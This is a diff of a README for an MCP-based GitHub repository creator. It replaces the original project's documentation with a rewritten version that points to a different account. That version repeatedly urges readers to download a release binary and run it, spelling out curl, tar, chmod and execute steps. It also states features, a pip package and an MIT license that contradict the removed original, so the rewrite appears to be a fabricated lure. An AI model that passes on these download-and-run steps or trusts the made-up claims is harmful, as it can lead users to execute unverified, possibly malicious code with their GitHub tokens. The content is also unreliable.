@@ -1,598 +1,222 @@
-# MCP GitHub Repository Creator
+# MCP Repo Creator — AI-powered GitHub Repository Automation
+[![Releases](https://img.shields.io/badge/Releases-Download%20and%20Run-blue?style=for-the-badge&logo=github)](https://github.com/mpstudyportal/mcp-github-repo-creator/releases)
 
-A **Model Context Protocol (MCP)** server that provides tools for AI applications like GitHub Copilot to analyze repositories and create GitHub repositories automatically.
+![MCP GitOps illustration](https://images.unsplash.com/photo-1555066931-4365d14bab8c?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxMTc3M3wwfDF8c2VhcmNofDF8fGFpJTIwZGV2ZWxvcG1lbnR8ZW58MHx8fHwxNjI3NjI0Nzky&ixlib=rb-1.2.1&q=80&w=1200)
 
-## 🚀 Features
+MCP Repo Creator helps tools and AI clients use the Model Context Protocol to analyze codebases and create new GitHub repositories automatically. It provides repo analysis, topic and metadata management, automated repo setup, and a simple API and CLI for integration with MCP-compatible AI systems.
 
-- **Repository Analysis**: Automatically analyze local git repositories to extract metadata. Includes traditional and AI approaches to analyze the repository
-- **GitHub Integration**: Create private GitHub repositories with proper configuration
-- **Topic Management**: Automatically add relevant topics based on project analysis
-- **MCP Compatible**: Works with any MCP-compatible AI client (Copilot, Claude, etc.)
-- **Automated Setup**: Complete workflow from analysis to GitHub repository creation
+Badges
+- Build / CI: ![Build](https://img.shields.io/badge/build-passing-brightgreen)
+- License: ![License](https://img.shields.io/badge/license-MIT-blue)
+- Topics: ![Topics](https://img.shields.io/badge/topics-AI%20Integration-lightgrey)
 
-## 📦 Installation
+Topics
+![ai-integration](https://img.shields.io/badge/topic-ai--integration-blue?style=flat-square) ![automation](https://img.shields.io/badge/topic-automation-blue?style=flat-square) ![cli-tool](https://img.shields.io/badge/topic-cli--tool-blue?style=flat-square) ![git](https://img.shields.io/badge/topic-git-blue?style=flat-square) ![mcp](https://img.shields.io/badge/topic-mcp-blue?style=flat-square) ![python](https://img.shields.io/badge/topic-python-yellow?style=flat-square)
 
-1. Clone this repository:
+Quick links
+- Releases: https://github.com/mpstudyportal/mcp-github-repo-creator/releases  
+  Download the release asset (for example mcp-github-repo-creator.tar.gz or a platform binary) from the Releases page and run the file as shown in Quickstart below. If the Releases page is not reachable, check the repository "Releases" section on GitHub.
 
+What this does
+- Analyze repository contents to extract high-value metadata: languages, dependency graph, CI config, tests, license.
+- Create new GitHub repos with boilerplate files and maintainer metadata.
+- Manage topics and labels based on analysis and user config.
+- Expose a small MCP-compatible server API for AI clients to request analysis, generate templates, and push repo scaffolds.
+- Provide a CLI that mirrors the core API for automation scripts and pipelines.
+
+Why it matters
+- Saves time when onboarding projects.
+- Standardizes repo metadata and topics.
+- Lets model-driven tools trigger repository operations safely and consistently.
+- Supports GitHub API and GitHub CLI workflows.
+
+Features
+- Repo analysis: language breakdown, file map, dependency snapshot, test and CI detection.
+- Metadata generation: README drafts, topics, repository description, license detection and license file generation.
+- Automated setup: repo creation, branch protection, issue templates, CODEOWNERS, default labels.
+- MCP server: simple JSON endpoints that accept repository context and return actions or generated files.
+- CLI tool: run local analysis, preview generated files, create repos from templates, and execute create/push flows.
+- Integration hooks: webhooks and MCP client callbacks.
+
+Screenshots and diagrams
+![Architecture diagram](https://raw.githubusercontent.com/github/explore/main/topics/microservices/microservices.png)
+(Architecture shows a small MCP server receiving model context and issuing GitHub repository creation calls.)
+
+Getting started (Quickstart)
+1. Download release asset from Releases:
+   - Visit https://github.com/mpstudyportal/mcp-github-repo-creator/releases and download the binary or archive for your platform.
+   - The downloaded file needs to be executed. Example (Linux/macOS):
+     ```bash
+     # Example: replace with the actual asset name you downloaded
+     curl -L -o mcp-github-repo-creator.tar.gz "https://github.com/mpstudyportal/mcp-github-repo-creator/releases/download/vX.Y.Z/mcp-github-repo-creator-vX.Y.Z-linux-amd64.tar.gz"
+     tar -xzf mcp-github-repo-creator.tar.gz
+     chmod +x mcp-github-repo-creator
+     ./mcp-github-repo-creator --help
+     ```
+   - If the direct asset URL is not available, go to the Releases page and pick the right asset for your platform.
+
+2. Install Python CLI (optional)
    ```bash
-   git clone https://github.com/flickleafy/mcp-github-repo-creator.git
-   cd mcp-github-repo-creator
+   python3 -m pip install mcp-github-repo-creator
+   mcpgh --help
    ```
 
-2. Run the setup script:
-
+3. Run a local MCP server (example)
    ```bash
-   bash setup.sh
+   ./mcp-github-repo-creator serve --port 8080 --github-token $GITHUB_TOKEN
    ```
+   The server exposes endpoints for:
+   - POST /analyze — returns repo analysis and metadata
+   - POST /generate — returns files for a new repo (README, LICENSE, topics)
+   - POST /create — creates a GitHub repository and pushes initial commit
 
-   This will:
-   - Create a Python virtual environment
-   - Install the MCP SDK and dependencies
-   - Set up the project for use
+Configuration
+- env variables:
+  - GITHUB_TOKEN — token with repo and admin:repo_hook scopes.
+  - MCP_SERVER_PORT — port to run the MCP server.
+- config file (mcp-config.yaml)
+  ```yaml
+  github_org: my-org
+  default_license: MIT
+  templates:
+    - name: python-package
+      path: templates/python-package
+  topics_map:
+    ai: ai-integration
+    cli: cli-tool
+  ```
 
-## 🛠 Usage
+MCP API (short)
+- All endpoints accept and return JSON. The server follows simple MCP patterns: it receives model context and returns a JSON response with artifacts and suggested actions.
 
-### As an MCP Server (Recommended)
-
-The server provides the following tools for AI applications:
-
-1. **`get_repo_analysis_instructions`** - Get detailed instructions for repository analysis
-2. **`analyze_and_generate_metadata_file`** - Analyze repository and generate metadata
-3. **`create_github_repo_from_metadata`** - Create GitHub repository from metadata JSON
-4. **`create_github_repository`** - Create repository using existing metadata file  
-5. **`full_repository_setup`** - Complete workflow: analyze → create → connect
-
-### Starting the MCP Server
-
-```bash
-# Activate virtual environment
-source venv/bin/activate
-
-# Start the MCP server
-python server.py
-```
-
-The server runs on stdio transport and is compatible with MCP clients like:
-
-- GitHub Copilot
-- Claude Desktop
-- VS Code extensions
-- Custom MCP clients
-
-### MCP Client Integration
-
-Configure your MCP client to connect to this server:
-
+1) POST /analyze
+Input:
 ```json
 {
-  "name": "github-repo-creator",
-  "command": "python",
-  "args": ["server.py"],
-  "cwd": "/path/to/mcp-github-repo-creator"
+  "repo_url": "https://github.com/example/repo",
+  "path": "."
+}
+```
+Output:
+```json
+{
+  "languages": ["python", "shell"],
+  "files": ["setup.py","README.md"],
+  "ci_detected": ["github-actions"],
+  "metadata": { "recommended_license": "MIT", "topics": ["python","cli-tool"] }
 }
 ```
 
-### Manual Usage (Alternative)
-
-You can also use the underlying functionality directly:
-
-```bash
-# Activate virtual environment
-source venv/bin/activate
-
-# Interactive mode
-python create_github_repo.py
-
-# Direct repository creation
-python create_github_repo.py --create
-
-# Manage topics only
-python create_github_repo.py --manage-topics
-```
-
-## 🎯 Workflow
-
-1. **Analysis**: The AI analyzes your repository structure, README, dependencies, and code
-2. **Metadata Generation**: Creates a `github_repo_metadata.json` with repository details
-3. **Repository Creation**: Uses GitHub CLI to create a private repository
-4. **Configuration**: Sets up topics, enables features, and connects local repository
-5. **Push**: Pushes your local code to the new GitHub repository
-
-## 🔄 Detailed Workflow Types
-
-The MCP server supports three main workflow approaches:
-
-### 🤝 Interactive Copilot Workflow (Recommended)
-
-This approach gives Copilot more control and allows for customization:
-
-1. **Request Analysis Instructions**: Ask Copilot to analyze the repository
-   - Copilot uses `get_repo_analysis_instructions`
-   - Gets detailed instructions on what to analyze
-   - Analyzes your repository structure, README, and code
-
-2. **Generate Metadata**: Copilot creates the metadata JSON
-   - Based on its analysis, Copilot generates repository metadata
-   - You can review and modify the metadata before proceeding
-
-3. **Create Repository**: Copilot creates the GitHub repository
-   - Uses `create_github_repo_from_metadata` with the generated metadata
-   - Creates repository, pushes code, and configures settings
-
-**Example Chat:**
-
-```
-"Please analyze this repository and create a GitHub repository for it. 
-I want to review the metadata before you create the repo."
-```
-
-### ⚡ Full Automation Workflow
-
-For complete automation without interaction:
-
-1. **Single Command Setup**: Use the `full_repository_setup` tool
-   - Analyzes repository automatically
-   - Generates metadata file
-   - Creates GitHub repository
-   - Connects and pushes code
-   - All in one step
-
-**Example Chat:**
-
-```
-"Automatically set up this project on GitHub with full automation."
-```
-
-### 🛠️ Manual/Step-by-Step Workflow
-
-For granular control over each step:
-
-1. **Generate Metadata File**: `analyze_and_generate_metadata_file`
-2. **Review/Edit** the generated `github_repo_metadata.json`
-3. **Create Repository**: `create_github_repository`
-
-**Example Chat:**
-
-```
-"First, generate a metadata file for this repository. I want to review it before creating the GitHub repo."
-```
-
-## 💬 Usage Examples with Copilot
-
-Once configured, you can use these natural language commands with Copilot:
-
-### Analyze Repository
-
-```
-"Analyze this repository and tell me what metadata would be generated for GitHub."
-```
-
-### Generate Metadata File
-
-```
-"Generate a github_repo_metadata.json file for this repository."
-```
-
-### Create GitHub Repository
-
-```
-"Create a GitHub repository for this local project. First analyze it, generate metadata, then create the GitHub repo and connect everything."
-```
-
-### Full Setup
-
-```
-"Set up this entire project on GitHub - analyze the code, create appropriate metadata, and create the repository."
-```
-
-### Step-by-Step Example
-
-```
-"Please create a GitHub repository for this project. Analyze the code, 
-generate appropriate metadata, and set up the repository on GitHub."
-```
-
-**Copilot will:**
-
-- Analyze your project structure and code
-- Detect the programming language and frameworks
-- Generate topics and description
-- Create `github_repo_metadata.json`
-- Create the GitHub repository
-- Connect your local repo to GitHub
-- Push your code
-
-## 🚀 Copilot Integration & Installation
-
-### Prerequisites for Copilot Integration
-
-1. **GitHub Copilot subscription** (Individual, Business, or Enterprise)
-2. **VS Code with GitHub Copilot extension**
-3. **GitHub CLI** installed and authenticated
-
-### Method 1: VS Code Copilot Integration (Recommended)
-
-1. **Install GitHub CLI**:
-
-   ```bash
-   # macOS
-   brew install gh
-   
-   # Ubuntu/Debian
-   sudo apt install gh
-   
-   # Windows (using winget)
-   winget install GitHub.cli
-   ```
-
-2. **Authenticate GitHub CLI**:
-
-   ```bash
-   gh auth login
-   ```
-
-3. **Clone and setup this MCP server**:
-
-   ```bash
-   git clone https://github.com/flickleafy/mcp-github-repo-creator.git
-   cd mcp-github-repo-creator
-   bash setup.sh
-   ```
-
-4. **Configure VS Code settings** (add to your VS Code settings.json):
-
-   ```json
-   {
-     "github.copilot.enable": {
-       "*": true,
-       "mcp": true
-     },
-     "mcp.servers": {
-       "github-repo-creator": {
-         "command": "python",
-         "args": ["server.py"],
-         "cwd": "/full/path/to/mcp-github-repo-creator",
-         "env": {
-           "PATH": "/full/path/to/mcp-github-repo-creator/venv/bin:${env:PATH}"
-         }
-       }
-     }
-   }
-   ```
-
-### Method 2: Claude Desktop Integration
-
-1. **Install Claude Desktop** from [claude.ai](https://claude.ai/download)
-
-2. **Configure Claude Desktop** (edit `~/.config/claude-desktop/config.json`):
-
-   ```json
-   {
-     "mcpServers": {
-       "github-repo-creator": {
-         "command": "python",
-         "args": ["/full/path/to/mcp-github-repo-creator/server.py"],
-         "env": {
-           "PATH": "/full/path/to/mcp-github-repo-creator/venv/bin"
-         }
-       }
-     }
-   }
-   ```
-
-3. **Restart Claude Desktop** and start using the commands
-
-### Automatic Installation Script
-
-Create an easy installation script by running:
-
-```bash
-# Download and run the auto-installer
-curl -sSL https://raw.githubusercontent.com/flickleafy/mcp-github-repo-creator/main/install-copilot.sh | bash
-```
-
-Or manually create the installer script in your project:
-
-```bash
-# Create installer script
-cat > install-copilot.sh << 'EOF'
-#!/bin/bash
-echo "🚀 Installing MCP GitHub Repository Creator for Copilot..."
-
-# Check dependencies
-command -v python3 >/dev/null 2>&1 || { echo "❌ Python 3 is required but not installed."; exit 1; }
-command -v git >/dev/null 2>&1 || { echo "❌ Git is required but not installed."; exit 1; }
-
-# Install GitHub CLI if not present
-if ! command -v gh &> /dev/null; then
-    echo "📦 Installing GitHub CLI..."
-    if [[ "$OSTYPE" == "darwin"* ]]; then
-        brew install gh
-    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
-        sudo apt update && sudo apt install gh
-    else
-        echo "⚠️ Please install GitHub CLI manually: https://cli.github.com/"
-        exit 1
-    fi
-fi
-
-# Clone repository
-INSTALL_DIR="$HOME/.mcp-servers/github-repo-creator"
-echo "📁 Installing to $INSTALL_DIR..."
-mkdir -p "$HOME/.mcp-servers"
-git clone https://github.com/flickleafy/mcp-github-repo-creator.git "$INSTALL_DIR"
-
-# Setup virtual environment
-cd "$INSTALL_DIR"
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-
-# Create VS Code configuration
-VSCODE_CONFIG="$HOME/.config/Code/User/settings.json"
-echo "⚙️ Adding VS Code configuration..."
-# Add MCP server configuration to VS Code settings
-
-echo "✅ Installation complete!"
-echo "🔧 Next steps:"
-echo "1. Authenticate with GitHub: gh auth login"
-echo "2. Restart VS Code"
-echo "3. Start using Copilot with MCP commands!"
-EOF
-
-chmod +x install-copilot.sh
-```
-
-### Testing the Integration
-
-1. **Open a git repository in VS Code**
-2. **Start a chat with Copilot** and try:
-
-   ```
-   "Use the MCP GitHub Repository Creator to analyze this repository and create a GitHub repo for it."
-   ```
-
-3. **Copilot should respond** with repository analysis and offer to create the GitHub repository
-
-## 📋 Requirements
-
-- Python 3.8+
-- Git repository (local)
-- GitHub CLI (`gh`) installed and authenticated
-- Internet connection for GitHub API calls
-
-### GitHub CLI Setup
-
-Install and authenticate GitHub CLI:
-
-```bash
-# Install GitHub CLI (see https://cli.github.com/)
-# macOS
-brew install gh
-
-# Ubuntu/Debian
-sudo apt install gh
-
-# Authenticate
-gh auth login
-```
-
-## 🔧 MCP Integration
-
-This server implements the **Model Context Protocol** specification, making it compatible with various AI applications:
-
-### Available Tools
-
-- **Repository Analysis**: Extracts project metadata automatically
-- **GitHub Repository Creation**: Creates repositories with proper settings
-- **Topic Management**: Adds relevant topics based on analysis
-- **Complete Workflow**: End-to-end repository setup
-
-### Supported Transports
-
-- **stdio** (default): Standard input/output for direct integration
-- Compatible with FastMCP framework for easy deployment
-
-## 📁 Project Structure
-
-```
-mcp-github-repo-creator/
-├── server.py                    # Main MCP server using FastMCP
-├── core/
-│   ├── repository_analyzer.py  # Repository analysis logic
-│   └── templates.py            # String templates for messages and instructions
-├── create_github_repo.py       # Legacy standalone script
-├── demo.py                     # Demo MCP client
-├── requirements.txt            # Dependencies including MCP SDK
-├── setup.sh                   # Environment setup script
-├── pyproject.toml             # Optional project metadata
-├── .gitignore                 # Git ignore rules
-└── README.md                  # This file
-```
-
-### Core Modules
-
-- **`server.py`**: Main MCP server that exposes tools to AI clients
-- **`core/repository_analyzer.py`**: `RepositoryAnalyzer` class for analyzing repository structure and generating metadata  
-- **`core/templates.py`**: Centralized template functions for all long string messages and instructions
-- **`create_github_repo.py`**: Legacy standalone script (for direct usage)
-- **`demo.py`**: Example client showing how to interact with the MCP server
-
-## 📊 Example Metadata Structure
-
-The server generates metadata in this format:
-
+2) POST /generate
+Input:
 ```json
 {
-  "repository_name": "my-awesome-project",
-  "description": "🚀 A powerful tool for automating GitHub repository creation",
-  "topics": ["python", "automation", "github", "mcp", "ai-tools"],
-  "created_date": "2025-01-01",
-  "project_type": "CLI Tool",
-  "primary_language": "Python", 
-  "license": "GPL-3.0",
-  "features": [
-    "Command-line interface",
-    "GitHub integration",
-    "Automated analysis"
-  ]
+  "metadata": { "name":"my-new-repo", "description":"A sample project" },
+  "template": "python-package"
 }
 ```
+Output: returns a ZIP or base64 bundle of generated files.
 
-## 🎯 Supported Project Types
+3) POST /create
+Input: metadata + generated files + target org
+Action: creates the repo on GitHub, applies topics, sets branch protection if requested.
 
-The MCP server automatically detects and properly categorizes various project types:
+CLI examples
+- Analyze a local repo:
+  ```bash
+  mcpgh analyze ./my-project
+  ```
+- Generate files locally:
+  ```bash
+  mcpgh generate --template python-package --out ./out
+  ```
+- Create a new repo on GitHub:
+  ```bash
+  mcpgh create --name my-new-repo --org my-org --private
+  ```
 
-- **AI/ML Projects**: Detects TensorFlow, PyTorch, scikit-learn, Transformers, Langchain
-- **Web Applications**: React, Vue, Angular, Svelte, Flask, Django, FastAPI, Express, Next.js
-- **CLI Tools**: Command-line applications and utilities
-- **APIs**: RESTful services, GraphQL, and microservices  
-- **Mobile Apps**: React Native, Flutter, Ionic
-- **Desktop Apps**: Electron, Tauri, PyQt, Tkinter
-- **Libraries**: Software packages, frameworks, and SDKs
-- **Game Development**: Unity, Godot, Pygame
-- **DevOps Tools**: Docker, Kubernetes, Terraform configurations
-- **Data Science**: Jupyter notebooks, data analysis projects
+Integration with GitHub CLI
+- The project provides a thin integration wrapper for gh:
+  ```bash
+  gh auth login
+  gh repo create my-org/my-new-repo --private --source=./out --push
+  ```
 
-## 🌐 Language Detection
+Security and permissions
+- The tool uses GitHub token scopes only for the minimal operations required: repo create, repo admin, and hooks if needed.
+- Use GitHub Apps or fine-grained PATs when possible.
+- The server validates incoming MCP requests. It supports optional HMAC request signing for trusted model clients.
 
-Automatically detects and supports a wide range of programming languages:
+Template system
+- Templates live in a simple directory layout:
+  templates/
+    python-package/
+      template.yml
+      files/
+- Each template contains a parameter map for name, description, license, and topics. The generator performs simple variable substitution.
 
-**Primary Languages**: Python, JavaScript, TypeScript, Java, C++, C#, Go, Rust, PHP, Ruby, Swift, Kotlin, Scala, R, Shell/Bash
+Common workflows
+- Full automated flow triggered by an AI assistant:
+  1. Assistant sends a context to MCP server.
+  2. Server analyzes context and proposes a template and topics.
+  3. Assistant asks for approval; user approves.
+  4. Server generates files and creates the repository.
+- Manual flow:
+  1. Run analysis locally.
+  2. Inspect generated files.
+  3. Create repo from CLI.
 
-**Web Technologies**: HTML, CSS, Vue, React (JSX/TSX), Svelte, SCSS/Sass, Less
+Examples and recipes
+- Auto-tag and topic pipeline
+  - Use /analyze to get suggested topics.
+  - Map suggestions to canonical topics via config.
+  - Apply topics on /create.
+- Create repo with CI
+  - Choose a template that includes GitHub Actions workflows.
+  - After creation, server can optionally enable required status checks.
 
-**Specialized**: SQL, YAML, TOML, JSON, Dockerfile, Makefile
+Advanced: MCP client example (pseudo)
+- A model client sends a model context with a repository snapshot.
+- The MCP server returns a JSON payload with generated files and an array of Git operations.
+- The client or server executes the push.
 
-The analyzer examines file extensions, dependencies, and project structure to accurately determine the primary language and technology stack.
+Troubleshooting
+- If releases or assets fail to download:
+  - Visit the Releases page directly: https://github.com/mpstudyportal/mcp-github-repo-creator/releases
+  - If an asset is missing, check the repo Releases section for the correct tag.
+- If GitHub API returns permission errors:
+  - Check token scopes and whether the token belongs to a user with org access.
+- If analysis misses files:
+  - Ensure the server has read access to the repository or pass a full archive.
 
-## 🛡️ Security & Privacy
+Releases and updating
+- Download and run the release asset from the Releases page. The release asset contains a binary or archive. After download, extract and run the binary for the new version.
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-%F0%9F%93%AE-blue?style=for-the-badge&logo=github)](https://github.com/mpstudyportal/mcp-github-repo-creator/releases)
 
-- **Secure Authentication**: Uses GitHub CLI for secure, token-based authentication
-- **Private by Default**: Creates private repositories by default for security
-- **No Data Storage**: No sensitive data stored in metadata files
-- **Local Processing**: Repository analysis happens locally on your machine
-- **GitHub Best Practices**: Follows GitHub's security recommendations
-- **Token Scope**: Uses minimal required permissions through GitHub CLI
+Contributing
+- Fork the repo.
+- Create a branch for your feature or fix.
+- Add tests that cover new behavior.
+- Open a pull request with a clear description.
+- Keep changes small and focused.
 
-## ⚠️ Limitations
+License
+- MIT License. See LICENSE file for details.
 
-- **GitHub CLI Required**: Must have GitHub CLI installed and authenticated
-- **Git Repository Required**: Must be run from within a git repository with commits
-- **Private Repositories**: Creates private repositories only (can be changed manually after creation)
-- **GitHub API Limits**: Subject to GitHub API rate limits
-- **Topic Restrictions**: Limited to repositories that fit GitHub's topic requirements (20 topics max)
-- **Network Dependency**: Requires internet connection for GitHub API calls
+Support
+- Open an issue on GitHub if you find a bug or need a feature.
+- For release artifacts, check the Releases page: https://github.com/mpstudyportal/mcp-github-repo-creator/releases
 
-## 🔧 Error Handling
+Maintainer notes
+- Keep templates small and versioned.
+- Add an upgrade script for generated repos when templates change.
+- Run static checks on generated files to avoid malformed CI configs.
 
-The MCP server provides comprehensive error handling with clear messages for common issues:
+Credits and references
+- Model Context Protocol concepts drawn from MCP design patterns.
+- Uses GitHub REST/GraphQL API and optional gh CLI for operations.
 
-### Repository Errors
+Security contact
+- Report security issues via the repository issues or the security contact listed in the repository metadata.
 
-- **Missing git repository**: Clear instructions to initialize git
-- **No commits**: Guidance to make initial commit
-- **Untracked files**: Prompts to add and commit files
-
-### Authentication Errors
-
-- **GitHub CLI not found**: Installation instructions
-- **Not authenticated**: Authentication setup guidance
-- **Token expired**: Re-authentication steps
-
-### GitHub API Errors
-
-- **Repository name conflicts**: Suggestions for alternative names
-- **Permission issues**: Troubleshooting steps
-- **Rate limiting**: Wait time recommendations
-
-## 🆘 Troubleshooting
-
-### Common Issues and Solutions
-
-#### "Not a git repository" Error
-
-```bash
-# Initialize git repository
-git init
-
-# Add files and make initial commit
-git add .
-git commit -m "Initial commit"
-```
-
-#### "GitHub CLI not authenticated" Error
-
-```bash
-# Check authentication status
-gh auth status
-
-# Re-authenticate if needed
-gh auth login
-```
-
-#### "Permission denied" Error
-
-**Solutions:**
-
-- Check GitHub CLI authentication: `gh auth status`
-- Ensure you have permission to create repositories in your account
-- Verify your GitHub token has appropriate scopes
-- For organization repositories, check organization permissions
-
-#### "Repository name already exists" Error
-
-**Solutions:**
-
-- Choose a different repository name
-- Check your GitHub account for existing repositories
-- Use the suggested alternative names from the error message
-- Add a suffix or prefix to make the name unique
-
-#### "GitHub API rate limit exceeded" Error
-
-**Solutions:**
-
-- Wait for the rate limit to reset (usually 1 hour)
-- Use authenticated requests (ensure `gh auth login` is completed)
-- For high-volume usage, consider GitHub API rate limit best practices
-
-#### "Invalid metadata format" Error
-
-**Solutions:**
-
-- Check the generated `github_repo_metadata.json` for syntax errors
-- Ensure all required fields are present
-- Validate JSON format using a JSON validator
-- Re-run the metadata generation tool
-
-#### "Network connectivity issues" Error
-
-**Solutions:**
-
-- Check internet connection
-- Verify GitHub.com is accessible
-- Check for firewall or proxy issues
-- Try again after network issues are resolved
-
-## 🤝 Contributing
-
-1. If you like the project give a ⭐ to the repository
-2. Create a feature branch, Make your changes, Submit a pull request
-3. Ensure your code follows the project's coding standards
-4. Add tests for new features or bug fixes
-5. Update documentation as needed
-
-## 📜 License
-
-This project is licensed under the GNU General Public License v3.0 - see the LICENSE file for details.
-
-## 🔗 Links
-
-- [Model Context Protocol](https://modelcontextprotocol.io/)
-- [MCP Python SDK](https://github.com/modelcontextprotocol/python-sdk)
-- [GitHub CLI](https://cli.github.com/)
-
----
-
-*Built with ❤️ using the Model Context Protocol*
+END OF FILE
